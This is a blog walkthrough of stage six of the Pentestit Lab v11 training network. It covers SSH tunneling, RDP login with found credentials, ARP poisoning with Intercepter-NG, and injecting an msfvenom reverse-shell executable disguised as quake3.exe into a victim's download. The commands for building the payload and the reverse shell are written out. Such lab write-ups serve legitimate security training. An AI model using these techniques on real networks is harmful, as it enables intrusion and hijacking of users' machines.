---
layout: single
title: "Pentestit Lab v11 - Director Token (6/12)"
header:
  overlay_image: gds-banner.jpg
  caption: "[__Pentestit Lab__](https://lab.pentestit.ru/)"
---

In my previous post "[Pentestit Lab v11 - CUPS Token (5/12)](https://jhalon.github.io/pentestit-lab-11-cups-token/)", we footprinted the CUPS server, exploited a SQL Injection Vulnerability that allowed us to gain access to the CUPS server, found an SSH Private Key, and found our fifth token. Today we will utilize our newly found SSH Private Key to gain access to the Director Subnet - which will include the following:

* Footprinting the DIR Subnet
* Utilizing Compromised Credentials for RDP Access
* Utilizing Interceptor-NG for ARP Poisoning
* Utilizing a MitM (Man-in-the-Middle) Attack for Shell Access
* Finding the RDP Token

## Footprinting the DIR Subnet

In my previous post, once we compromised the CUPS Server, we were able to find an SSH Key that allowed us access to the __172.16.0.252__ Router in the Main Office Subnet.

We can see from the [Network Map](https://jhalon.github.io/images/ptl-3.png) that the router gives us access to three other subnets - __192.168.10.x__, __192.168.11.x__, and __192.168.12.x__.

If you remember correctly, after we compromised the AD Server we also found a file called __network\_test.txt__.

```console
root@kali:~/pentestit# cat network_test.txt 
Hi, mate! Need to test ARP-table in DIR subnet.
I'll install intercepter admin:77_GrantedSuperAdmin_77
```

Now that we have both the credentials to access a device in the DIR Subnet, and we have an SSH Private Key that will allow us to tunnel though the router, we can now go ahead and attempt to attack the DIR Subnet, more specifically the __192.168.12.1__ or the Directors Computer.

Let's first start by testing if we have access to the __172.16.0.252__ router with the SSH Key that we saved previously called __morgan.key__.

```console
root@kali:~/pentestit# ssh -i morgan.key morgan@172.16.0.252
Last login: Wed Jul 19 03:55:11 2017 from 10.255.0.30
##########################
PasswordAuthentication no
##########################
morgan@tl11-172-16-0-252:~$
```

Awesome, now that we know we have access let's open up another Console and utilize SSHuttle to create an SSH Tunnel between our Kali Machine and the three subnets.

```console
root@kali:~/pentestit# sshuttle -e "ssh -i morgan.key" -r morgan@172.16.0.252 192.168.10.0/24 192.168.11.0/24 192.168.12.0/24
client: Connected.
```

Once done, either from your Kali Machine or the Router we can utilize Nmap to Footprint the DIR Subnet of __192.168.12.1__.

```console
morgan@tl11-172-16-0-252:~$ nmap -sV -Pn -n 192.168.12.1-3

Starting Nmap 6.47 ( http://nmap.org ) at 2017-07-19 04:17 MSK
Nmap scan report for 192.168.12.1
Host is up (0.00069s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE        VERSION
3389/tcp open  ms-wbt-server?

Nmap scan report for 192.168.12.2
Host is up (0.00050s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap scan report for 192.168.12.3
Host is up (0.00077s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE        VERSION
3389/tcp open  ms-wbt-server?

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 102.57 seconds
```

It seems these are Windows Devices running RDP, so we will have to utilize XFreeRDP to be able to connect to them with the credentials we found from the AD Server.

## Utilizing Compromised Credentials for RDP Access

After some time testing, I found out that the __admin__ account only had RDP Access to the __192.168.12.2__ computer. So, let's RDP into the device and see what we have to work with.

```console
root@kali:~/pentestit# xfreerdp /u:admin /p:77_GrantedSuperAdmin_77 /v:192.168.12.2
connected to 192.168.12.2:3389
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@           WARNING: CERTIFICATE NAME MISMATCH!           @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
The hostname used for this connection (192.168.12.2) 
does not match the name given in the certificate:
Common Name (CN):
	ARM-1
A valid certificate for the wrong name should NOT be trusted!
Certificate details:
	Subject: CN = ARM-1
	Issuer: CN = ARM-1
	Thumbprint: 6e:3f:1f:e6:15:ee:13:c5:9f:f6:87:db:83:32:86:a4:c8:bb:7e:6f
The above X.509 certificate could not be verified, possibly because you do not have the CA certificate in your certificate store, or the certificate has expired. Please look at the documentation on how to create local certificate store for a private CA.
Do you trust the above certificate? (Y/N) Y
```

Once successfully authenticated you should see a new window with RDP Access to the Desktop. I ran `whoami` and `ipconfig` just to verify and prove to my users that I am currently in the __192.168.12.2__ device.

<a href="/images/ptl-43.png"><img src="/images/ptl-43.png"></a>

I decided to take a look around the computer for any files that might be of interest - and I came across the following __todo.txt__ file.

<a href="/images/ptl-44.png"><img src="/images/ptl-44.png"></a>

In all honesty I have no idea what this is for, but I saved it just in case it might come in handy in the future.

From here I kept looking around and I found something that really caught my eye. [Interceptor-NG](http://sniff.su/about.html) was installed on the computer!

<a href="/images/ptl-45.png"><img src="/images/ptl-45.png"></a>

Intercepter-NG is a multifunctional network toolkit for various types of IT specialists. The main purpose is to recover *interesting* data from the network stream and perform different kinds of MitM attacks.

The network text file that we found on the AD Server said something about testing [ARP Tables](http://searchnetworking.techtarget.com/definition/Address-Resolution-Protocol-ARP) in the DIR Subnet.

With this in mind I decided to do some [ARP Spoofing](https://www.veracode.com/security/arp-spoofing) between the Directors Computer (__192.168.12.1__) and the __192.168.12.3__ device to see if they weren't communicating with each other - maybe I might find something of interest there.

## Utilizing Interceptor-NG for ARP Poisoning

Once you have found Interceptor-NG, go ahead and fire it up. You might need to extract the folder before you are able to run it - so do just that if need be.

Once fired up, you will see an empty table - just right click inside that table and select "__Smart Scan__". This will automatically scan the subnet and find any device that might be connected.

<a href="/images/ptl-46.png"><img src="/images/ptl-46.png"></a>

Once you have that done, you will see three devices including the Directors Device and the __192.168.12.3__ device. From here, go to __DHCP Mode__ and configure the screen like so:

<a href="/images/ptl-47.png"><img src="/images/ptl-47.png"></a>

Do note that your __Stealth__ IP might be different from mines, so if it was already set, don't change it!

Also, 192.168.12.3 is not a gateway, we set it as the gateway IP because we are interested not in the communication of the director's machine with the external network, but in the communications within this subnet.

Moving on. Once you have configured DHCP Mode, go to __RAW Mode__ and add the following PCAP Filter so we don't see our RDP traffic.

<a href="/images/ptl-48.png"><img src="/images/ptl-48.png"></a>

After you have that set up, click the __Start__ button to start Sniffing, NAT, and ARP Poisoning.

<a href="/images/ptl-49.png"><img src="/images/ptl-49.png"></a>

Once you have started that, go back to __RAW Mode__ to see the traffic being captured. After some time you should see an interesting [GET](https://www.w3schools.com/tags/ref_httpmethods.asp) request being made to __192.168.12.3__ for __quake3.exe__ from the Directors Computer.

<a href="/images/ptl-50.png"><img src="/images/ptl-50.png"></a>

## Utilizing a MitM (Man-in-the-Middle) Attack for Shell Access

Now that we know that the Director is trying to download quake3, let's see if we can't [MitM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) his download to server our own content... a backdoor shell!

We know that these devices are Windows Machines, so let's utilize msfvenom to craft a backdoor executable called "__quake3.exe__" that will connect back to the __192.168.12.2__ device via port 80.

```console
root@kali:~/pentestit# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.12.2 LPORT=80 -f exe > quake3.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Once that's done let's go back to the __192.168.12.2__ device. If you look around the system some more you should find that Netcat is also installed on the device.

Go ahead and create a netcat listener to download the quake3.exe file that we have. You might be asked to allow netcat to communicate past the firewall, so make sure you click "__Allow access__" on the Windows Security Alert.

<a href="/images/ptl-51.png"><img src="/images/ptl-51.png"></a>

Back on our Kali Machine, let's connect to the Netcat listener and server our quake3 backdoor shell.

```console
root@kali:~/pentestit# nc -w 3 192.168.12.2 1234 < quake3.exe
```

If done correctly, you should see a connection was established from our Kali Machine to the __192.168.12.2__ machine via netcat.

<a href="/images/ptl-52.png"><img src="/images/ptl-52.png"></a>

And if we navigate to the netcat-1.11 folder, you will find our back doored quake3 file in there!

<a href="/images/ptl-53.png"><img src="/images/ptl-53.png"></a>

Now that we have the shell on our device, let's go ahead and spoof the directors connection!

What we need to do now is to configure the implementation of this file in the HTTP response. To do this, enable SSL Strip in Interceptor-NG. Although the file is not downloaded over SSL, this is necessary to enable MitM in Intercepter. 

<a href="/images/ptl-54.png"><img src="/images/ptl-54.png"></a>

After that's done, click on the Needle Icon so we can set up Injection Rules to inject our back doored quake3 file, like so:

<a href="/images/ptl-55.png"><img src="/images/ptl-55.png"></a>

Once you have done that, press "__OK__" and start up Interceptor-NG. This also will startup NAT and ARP Poisoning along with the MitM Attack for the Director's Computer.

While that's running, create a Netcat listener on port 80 and just wait...

<a href="/images/ptl-56.png"><img src="/images/ptl-56.png"></a>

If done correctly, you should get Backdoor Shell access to the director's computer!


## Finding the RDP Token

Now that we have shell access to the Director's Computer, let's see what he has in his Documents Folder.

<a href="/images/ptl-57.png"><img src="/images/ptl-57.png"></a>

Inside, you should find the Token and an SSH Private Key for user __remote__, allowing access to the __192.168.11.1__ device in the other subnet! Go ahead and save that as we will need it for later.

## Token (6/12)

Congrats on finding the token! Go ahead and submit it on the main page to gain points for it!

You might be wondering why I didn't post the actual token. Well, what would be the fun in that if I did? Go through and actually try to compromise the Directors Computer via ARP Spoofing and MitM Attacks.

You learn by doing, so go through this walkthrough, and the lab - and learn something new!

That's all for now, stay tuned for my next post as we compromise Token (7/12) - The Connect Token!
